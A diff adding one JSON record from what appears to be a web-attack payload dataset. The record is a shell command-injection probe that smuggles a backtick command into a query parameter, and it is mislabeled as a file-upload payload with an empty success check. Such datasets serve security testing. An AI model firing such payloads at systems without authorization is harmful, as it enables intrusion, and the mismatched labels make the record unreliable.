@@ -1,0 +1,13 @@
+[
+  {
+    "payload_id": "OWP-57053",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "`echo .$NETMANID | md5sum | cut -c2-10`",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  }
+]
